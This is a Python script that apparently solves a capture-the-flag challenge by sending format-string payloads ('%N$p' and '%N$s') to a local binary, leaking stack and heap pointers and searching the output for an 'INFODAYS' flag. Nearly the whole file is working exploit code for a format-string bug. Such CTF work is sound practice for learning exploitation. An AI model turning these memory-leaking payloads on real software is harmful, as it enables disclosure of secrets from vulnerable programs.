#!/usr/bin/env python3
import subprocess
import re

def run_payload(payload):
    proc = subprocess.run(['./var_review'], input=payload.encode(), capture_output=True)
    output = proc.stdout.decode('utf-8', errors='ignore')
    lines = output.split('\n')
    
    # Find the line with the response (between │ characters, after "Referee's Response:")
    for i, line in enumerate(lines):
        if '│' in line and 'Referee' not in line and '├' not in line and '└' not in line and '┌' not in line:
            # This is the response line
            # Extract between the first and last │
            parts = line.split('│')
            if len(parts) >= 2:
                return parts[1].strip()
    return ""

print("[*] Finding format string offset...")

# First, get all leaks with %p
payload = " ".join([f"%{i}$p" for i in range(1, 30)])
result = run_payload(payload)
print(f"[*] Leaks: {result}")

# Now try each offset individually
for offset in range(1, 30):
    payload = f"%{offset}$p"
    leak = run_payload(payload)
    if leak and leak != '(nil)':
        print(f"Offset {offset}: {leak}")
        
        # Try to read as string
        payload2 = f"%{offset}$s"
        result2 = run_payload(payload2)
        if 'INFODAYS' in result2 or ('{' in result2 and '}' in result2):
            print(f"\n[+] FLAG FOUND at offset {offset}!")
            print(f"[+] FLAG: {result2}")
            break
        
        # Check if it's a heap pointer (0x55 or 0x56 in high bytes)
        if leak.startswith('0x'):
            try:
                addr = int(leak, 16)
                if (addr >> 40) in [0x55, 0x56]:
                    print(f"[*] Heap pointer at offset {offset}, reading content...")
                    result2 = run_payload(f"%{offset}$s")
                    if result2 and len(result2) > 5:
                        print(f"    Content: {result2[:80]}")
                        if 'INFODAYS' in result2:
                            print(f"\n[+] FLAG: {result2}")
                            break
            except:
                pass

print("\n[*] Done")
